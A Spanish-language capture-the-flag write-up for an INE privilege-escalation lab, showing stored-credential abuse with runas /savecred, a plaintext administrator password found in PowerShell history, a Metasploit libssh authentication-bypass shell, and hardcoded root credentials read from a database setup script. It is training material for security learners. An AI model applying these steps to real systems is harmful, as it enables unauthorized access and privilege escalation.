
# Privilege Escalation CTF 1

## <mark style="color:purple;">Introducción</mark>

Este laboratorio se centra en la explotación de datos almacenados, el análisis del historial del sistema y el aprovechamiento de vulnerabilidades para escalar el acceso a múltiples máquinas. Explorarás credenciales almacenadas, investigarás registros del sistema y usarás Metasploit para obtener acceso remoto.&#x20;

Tu objetivo es capturar todas las flags ocultas en el entorno.

#### Lab

En este laboratorio tenemos 2 máquinas, una máquina Kali Linux y la máquina Windows `target1.ine.local`:

<figure><img src="/files/PbQzbuckGZBicxQCqCtP" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Task 1</mark>

> Extraer las credenciales almacenadas de `target1.ine.local`

#### Hosts

Tenemos 2 objetivos: `target1.ine.local` y `target2.ine.local`

```bash
┌──(root㉿INE)-[~]
└─# cat /etc/hosts

127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.18       INE
127.0.0.1 AttackDefense-Kali
192.45.168.2    INE
10.10.41.4      INE
192.45.168.2 INE
192.45.168.3 target2.ine.local
10.2.18.57    target1.ine.local
```

Por el momento nos centraremos en `target1.ine.local` ya que para acceder por el navegador a `target2` necesitamos credenciales que aún no tenemos.

### Enumeración manual

No tenemos `PowerUp.ps1` en el objetivo así que lo enumeraremos manualmente.

#### Credenciales almacenadas

Encontramos credenciales almacenadas del usuario john:

```powershell
PS C:\Users\student\Desktop> cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=EC2AMAZ-A251FFF\john
    Type: Domain Password
    User: EC2AMAZ-A251FFF\john
```

### Impersonar usuario john

```powershell
PS C:\Users\student\Desktop> runas.exe /savecred /user:john cmd
Attempting to start cmd as user "EC2AMAZ-A251FFF\john" ...
```

Eso nos abre una CMD como el usuario john.

### Flag 1

Podemos encontrar en su escritorio la `flag1`:

```powershell
C:\Users\john\Desktop>cd john-data

C:\Users\john\Desktop\john-data>dir
 Volume in drive C has no label.
 Volume Serial Number is 1CE9-5F0A

 Directory of C:\Users\john\Desktop\john-data

04/08/2026  10:41 AM    <DIR>          .
02/04/2025  09:16 AM    <DIR>          ..
02/04/2025  09:17 AM               780 data.txt
04/08/2026  10:41 AM                34 flag1.txt
               2 File(s)            814 bytes
               2 Dir(s)  11,442,982,912 bytes free
```

```powershell
C:\Users\john\Desktop\john-data>type flag1.txt
3cf869cfb1ec46b8b6b436f6********
```

El archivo `data.txt` contiene texto dummy sin ninguna credencial extra.

***

## <mark style="color:purple;">Task 2</mark>

> Analizar el historial del sistema en `target1.ine.local` para descubrir datos confidenciales.

### Impersonar Powershell

Usamos la misma técnica de antes con las credenciales almacenadas pero abriendo una PowerShell:

```powershell
PS C:\Users\student\Desktop> runas.exe /savecred /user:john powershell
Attempting to start cmd as user "EC2AMAZ-A251FFF\john" ...
```

### Historial de PowerShell

En el historial de PowerShell nos encontramos credenciales en texto plano del usuario administrator!

```powershell
PS C:\Windows\system32> Get-Content (Get-PSReadLineOption).HistorySavePath

cd /
ls
cd .\Windows\
ls
clear
whoami
Get-Process
<---SNIP--->
cd .\Windows\
cd /
$username = 'administrator'
$passwd = "superStrong_123890"
```

Abrimos una nueva PowerShell como administrator:

```bash
PS C:\Windows\system32> whoami
ec2amaz-a251fff\administrator
```

### Flag 2

```powershell
PS C:\Users\Administrator> ls

    Directory: C:\Users\Administrator

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---          2/3/2025   8:50 AM                3D Objects
d-r---          2/3/2025   8:50 AM                Contacts
d-r---          2/3/2025   8:50 AM                Desktop
d-r---          2/3/2025   8:50 AM                Documents
d-r---          2/3/2025   8:50 AM                Downloads
d-r---          2/3/2025   8:50 AM                Favorites
d-r---          2/3/2025   8:50 AM                Links
d-r---          2/3/2025   8:50 AM                Music
d-r---          2/3/2025   8:50 AM                Pictures
d-r---          2/3/2025   8:50 AM                Saved Games
d-r---          2/3/2025   8:50 AM                Searches
d-r---          2/3/2025   8:50 AM                Videos
-a----          4/8/2026  10:41 AM             34 flag2.txt

PS C:\Users\Administrator> type .\flag2.txt
71e4b24e1054458da5a8f434********
```

***

## <mark style="color:purple;">Task 3</mark>

> Explotar servicios vulnerables en `target2.ine.local` para obtener una shell.

### Escaneo de puertos

```bash
┌──(root㉿INE)-[~]
└─# nmap -v -sV target2.ine.local

PORT   STATE SERVICE VERSION
22/tcp open  ssh     libssh 0.8.3 (protocol 2.0)
80/tcp open  http    Werkzeug/3.1.3 Python/3.13.1
```

Solo encontramos abiertos los puertos 22 y 80. Al acceder al objetivo encontramos un panel de login:

<figure><img src="/files/730OgUIPJUlN4a6MhfeY" alt=""><figcaption></figcaption></figure>

Intentamos fuerza bruta sin éxito.

### Libssh exploit

Vemos que el servicio SSH utiliza `libssh 0.8.3`, y encontramos un exploit de auth\_bypass en Metasploit:

```bash
msf6 > search libssh 0.8.3

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/libssh_auth_bypass  2018-10-16       normal  No     libssh Authentication Bypass Scanner
   1    \_ action: Execute                      .                .       .      Execute a command
   2    \_ action: Shell                        .                .       .      Spawn a shell


Interact with a module by name or index. For example info 2, use 2 or use auxiliary/scanner/ssh/libssh_auth_bypass
After interacting with a module you can manually set a ACTION with set ACTION 'Shell'

msf6 > use 0
```

```bash
set RHOSTS target2.ine.local
set SPAWN_PTY true
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > exploit

[*] 192.58.203.3:22 - Attempting authentication bypass
[*] Attempting "Shell" Action, see "show actions" for more details
[*] Command shell session 1 opened (192.58.203.2:42661 -> 192.58.203.3:22) at 2026-04-08 17:19:49 +0530
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Shell Session

```bash
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > sessions 1
[*] Starting interaction with 3...

Shell Banner:
_[?2004hsh-5.2$
-----    

sh-5.2$ whoami
whoami
user
```

### Flag 3

```bash
sh-5.2$ cd /home
sh-5.2$ ls
entrypoint.sh  temp  user  webapp

sh-5.2$ cd user
sh-5.2$ ls
flag3.txt

sh-5.2$ cat flag3.txt
b58ad6fa39494a50aaaa2f60********
```

***

## <mark style="color:purple;">Task 4</mark>

> Extraer los archivos de la base de datos en `target2.ine.local` para recuperar las credenciales de root.

### Escalada de privilegios

No tenemos sudo en la máquina:

```bash
sh-5.2$ sudo -l
sudo -l
sh: sudo: command not found
```

### Tratamiento de la TTY

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### Enumeración

En la home de user encontramos un archivo de configuración de la base de datos:

```bash
[user@target2 webapp]$ ls
app.py  database.db  database_setup.py  static  templates  venv
```

El archivo `database_setup.py` contiene credenciales de root hardcodeadas:

```python
[user@target2 webapp]$ cat database_setup.py

import sqlite3

# Connect to SQLite database
conn = sqlite3.connect("/home/webapp/database.db")
cursor = conn.cursor()

# Create users table
cursor.execute("""
CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    password TEXT NOT NULL
)
""")

# Insert a root user with hardcoded credentials
cursor.execute("INSERT INTO users (username, password) VALUES ('root', 'strongP@ssowrd123!!')")
```

### Cambiar a root

```bash
[user@target2 webapp]$ su root
Password: strongP@ssowrd123!!

[root@target2 webapp]# whoami
root
```

### Flag 4

```bash
[root@target2 webapp]# cd /root

[root@target2 ~]# ls
flag4.txt      

[root@target2 ~]# cat flag4.txt
11b03dd9a73d4aacb9f9ae04********
```
